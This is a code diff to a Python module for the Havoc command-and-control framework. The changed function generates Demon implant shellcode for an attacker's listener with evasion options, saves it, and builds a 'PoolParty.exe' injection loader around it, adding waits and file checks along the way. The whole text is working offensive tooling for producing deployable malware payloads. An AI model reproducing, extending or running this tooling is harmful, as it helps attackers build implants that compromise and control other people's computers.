@@ -5,13 +5,21 @@ from havoc import Demon, RegisterCommand, RegisterModule
 import havoc
 import os
 from base64 import b64decode, b64encode
+from time import sleep
 
 
 #cwd = os.getcwd()
 cwd = "/home/cipher/Github/havoc-PoolParty"
-shellcode_file_path = cwd + "/payload.bin"
+#shellcode_file_path = cwd + "/payload.bin"
+shellcode_file_path = "/home/cipher/Github/havoc-PoolParty/payload.bin"
+poolparty_file_path = cwd + "/PoolParty.exe"
 
 def generate_payload(demon, arch, listener):
+	if os.path.exists(shellcode_file_path):
+		os.remove(shellcode_file_path)
+	if os.path.exists(poolparty_file_path):
+		os.remove(poolparty_file_path)
+
 	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating shellcode")
 	arch = str(arch)
 	listener = str(listener)
@@ -37,10 +45,17 @@ def generate_payload(demon, arch, listener):
                 \"Stack Duplication\": true \
             }"
         )
-	demon.ConsoleWrite(demon.CONSOLE_INFO, "Saving shellcode to a file")
-	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
-	#os.system(f"python3 generate.py -f {shellcode_file_path} ")
-	demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
+	sleep(120)
+	demon.ConsoleWrite(demon.CONSOLE_INFO, f"{shellcode_file_path}")
+	if os.path.exists(shellcode_file_path):
+		demon.ConsoleWrite(demon.CONSOLE_INFO, "Saving shellcode to a file")
+		demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
+		os.system(f"python3 generate.py -f {shellcode_file_path} ")
+		sleep(10)
+		if os.path.exists(poolparty_file_path):
+			demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
+	else:
+		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Shellcode generation failed!")
 	return False
 
 def generate(demonID, *params):
